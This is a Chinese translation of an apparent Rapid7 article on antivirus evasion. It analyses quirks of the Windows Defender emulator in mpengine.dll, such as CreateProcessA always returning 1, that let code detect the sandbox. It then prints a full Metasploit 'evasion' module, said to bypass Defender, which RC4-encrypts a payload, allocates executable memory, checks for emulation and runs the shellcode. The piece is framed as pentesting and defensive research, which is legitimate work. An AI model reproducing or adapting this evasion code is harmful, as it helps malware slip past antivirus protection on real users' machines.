在我们进行免杀研究的早期阶段，我们注意到，只有当以特定方式调用某些Windows API时才会触发Windows
Defender，例如，检查[IsDebuggerPresent](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680345\(v=vs.85).aspx
"IsDebuggerPresent")的输出、通过[VirtualAlloc](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887\(v=vs.85).aspx
"VirtualAlloc")或[VirtualProtect](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366898\(v=vs.85).aspx
"VirtualProtect")分配具有RWX权限的内存、使用[CreateFile](https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-createfilea
"CreateFile")时，等等。我们怀疑Windows Defender会拦截这些API调用，并查找可疑行为，因此，我们考察了Windows
Defender的mpengine.dll组件（执行该任务的核心引擎），并发现了一些有趣的结果
Windows
Defender的仿真引擎非常容易搞到手，既可以在现代Windows系统上找到它，也可以直接从Microsoft的[定义更新](https://www.microsoft.com/en-us/wdsi/definitions#manual
"定义更新")页面下载。值得高兴的是，Microsoft还为mpengine.dll提供了调试符号，所以，理解起来应该会方便得多了。
虽然Windows
Defender的模拟器是一个非常复杂的分析引擎，但恶意软件作者仍然可以设法利用它来实现免杀。下面，我们将考察CreateProcessA
API，分析引擎将利用mpengine.dll中的Mpengine!KERNEL32_DLL_CreateProcessA对其进行模拟。在IDA
Pro中，相应的代码如下所示：
当我们检查这个反汇编后的函数的图形视图的第一个节点时，变量pe_set_return_值立即引起了我们的关注：
这个函数有两个参数，相应的伪代码如下所示：
    pe_set_return_value(1, 0);
在pe_set_return_value中，第一个参数（ebp+arg_0）被传递给一个名为DTProcessor_32::setreg的函数：
上面的调用图基本上等价于下列代码：
    // 0x32 is hex for 50 (in decimal) 
    // 1 is our frst argument for pe_set_return_value 
    setreg(0x32, 1);
在setreg函数中，有一个switch语句，它使用第一个参数作为其条件变量。因此，当值为0x32（十进制数为50）时，我们将抵达该代码块：
换句话说，CreateProcessA的返回值始终为1。根据该API的MSDN文档中的相关介绍：
    返回值
    如果函数成功，则返回值为非零值。
    如果函数失败，则返回值为零。要获取更详细的错误信息，请调用GetLastError。
    请注意，该函数会在进程初始化之前返回。如果找不到所需的DLL或初始化失败，则终止该进程。要获取进程的终止状态，请调用GetExitCodeProcess。
这意味着，如果我们故意使函数失败并检查返回值是否为0，我们应该能够被动地识别出代码是否位于沙箱之中。例如：
这只是其中的一个例子，实际上，相当多的API在mpengine.dll中的行为，与沙箱外的行为都存在差异，并且，我们只要使用其中一个这样的API，就足以搞清楚代码是否位于沙箱之中。为了防止攻击者检测出Windows
Defender的仿真API，Windows Defender必须全面地模拟其Hook的Windows API的所有的行为，包括其中的"古怪"行为。
鉴于Windows Defender的市场份额巨大，并且是许多现代Windows机器的第一道防线，所以，安全社区自然不会放过它。例如，我们从[Alexei
Bulazel](https://twitter.com/0xAlexei "Alexei Bulazel")的一次演讲中（“[Reverse
Engineering Windows Defender’s Antivirus
Emulator](https://i.blackhat.com/us-18/Thu-August-9/us-18-Bulazel-Windows-Offender-Reverse-Engineering-Windows-Defenders-Antivirus-Emulator.pdf "Reverse
Engineering Windows Defender’s Antivirus Emulator")”），发现了许多与仿真器由关的梗，下面仅举几例：
  * GetUserNameA将返回用户名“JohnDoe”
  * GetComputerNameExA会返回“HAL9TH”
  * 虚拟文件系统中存在伪配置文件
  * Winsock库包含的字符串经常以“Mp”开头 
# **免杀模块类型**
* * *
为了将现有成果和未来的免杀研究成果结合到一个便于访问的格式中，我们为Metasploit框架添加了一个新的模块类型：“evasion”。这种新型模块将允许安全社区方便地创建和共享免杀技术，而无需调用msfvenom或msfconsole来生成初始有效载荷。相反，免杀技术可以直接集成到Metasploit框架中
免杀模块的功能类似于Metasploit中的[文件格式漏洞利用](https://github.com/rapid7/metasploit-framework/wiki/How-to-Use-the-FILEFORMAT-mixin-to-create-a-file-format-exploit
"文件格式漏洞利用")，因为两者的输出都是文件。免杀模块的不同之处在于，它不会自动启动有效载荷处理程序，当然，它的目标（AV和其他检测工具）与文件格式漏洞利用（易受攻击的软件）的目标不同。这样的话，用户就能够以自己想要的风格或格式来生成代码，而无需定义漏洞利用模块所需的各种方法或元数据。
免杀模块类型与其他模块类型的级别是并列的，这些模块类型包括：辅助模块、编码器模块、漏洞利用模块、Nop模块、有效载荷模块和Post模块。下面的代码结合了上面解释的所有免杀技术，创建一个完整的模块，截至本文发布之日为止，该模块完全可以绕过Microsoft
Windows Defender的检测：
    ##
    # This module requires Metasploit: https://metasploit.com/download
    # Current source: https://github.com/rapid7/metasploit-framework
    ##
    require 'metasploit/framework/compiler/windows'
    class MetasploitModule  'Microsoft Windows Defender Evasive Executable',
                'Description' => %q{
                    This module allows you to generate a Windows EXE that evades against Microsoft
                    Windows Defender. Multiple techniques such as shellcode encryption, source code obfuscation, Metasm, and anti-emulation are used to achieve this.
                    For best results, please try to use payloads that use a more secure channel such as HTTPS or RC4 in order to avoid the payload network traffc getting caught by antivirus better.
                },
                'Author' => [ 'sinn3r' ],
                'License' => MSF_LICENSE,
                'Platform' => 'win',
                'Arch' => ARCH_X86,
                'Targets' => [ ['Microsoft Windows', {}] ]
            ))
        end
    def rc4_key
        @rc4_key ||= Rex::Text.rand_text_alpha(32..64)
    end
    def get_payload
        @c_payload ||= lambda {
            opts = { format: 'rc4', key: rc4_key }
            junk = Rex::Text.rand_text(10..1024)
            p = payload.encoded + junk
            return {
            size: p.length,
            c_format: Msf::Simple::Buffer.transform(p, 'c', 'buf', opts)
            }
        }.call
    end
    def c_template
        @c_template ||= %Q|#include 
    #include 
    // The encrypted code allows us to get around static scanning
    #{get_payload[:c_format]}
    int main() {
        int lpBufSize = sizeof(int) * #{get_payload[:size]};
        LPVOID lpBuf = VirtualAlloc(NULL, lpBufSize, MEM_COMMIT,| Rapid7.com Encapsulating Antivirus (AV) Evasion Techniques - 20
    0x00000040);
        memset(lpBuf, '\\0', lpBufSize);
        HANDLE proc = OpenProcess(0x1F0FFF, false, 4);
        // Checking NULL allows us to get around Real-time protection
        if (proc == NULL) {
            RC4("#{rc4_key}", buf, (char*) lpBuf, #{get_payload[:size]});
            void (*func)();
            func = (void (*)()) lpBuf;
            (void)(*func)();
        }
        return 0;
    }|
        end
        def run
            vprint_line c_template
            # The randomized code allows us to generate a unique EXE
            bin = Metasploit::Framework::Compiler::Windows.compile_
            random_c(c_template)
            print_status("Compiled executable size: #{bin.length}")
            file_create(bin)
        end
    end
当然，这里给出的这个示例，只是用来展示的。实际应用时，请务必检查Metasploit框架树中的最新代码，因为这些模块API会随着时间的推移而发生变化和改进。
# **结束语**
* * *
我们在Metasploit中引入了多项支持AV免杀的新功能，其中包括代码随机化框架，新型的AV仿真检测代码，编码和加密例程，以及新型的免杀模块类型。在这些功能的帮助下，如今向Metasploit
Framework添加免杀技术已经变得前所未有的简单。安全模块开发人员和渗透测试人员都能从中受益良多，这些新功能不仅可以帮助渗透测试人员构建突破用户部署的防御工具，还能帮助研究人员和开发人员改进和测试防御工具，同时，还能帮助IT专业人员能够更有效地了解不断涌现的各种攻击技术。
我们欢迎来自AV社区的讨论和合作，共同关注改进Metasploit中的逃避技术和AV软件中的防御措施。对于现有的Metasploit框架用户，可以从[Github](https://github.com/rapid7/metasploit-framework "Github")下载最新的主分支，或者下载最新的Metasploit 5综合开发包来访问这些新的免杀功能。
Metasploit是Rapid7与开源社区之间的合作成果。我们共同致力于为防御者提供世界级的安全内容，以提升大家理解、利用和共享漏洞的能力。要下载Metasploit，请访问metasploit.com网站。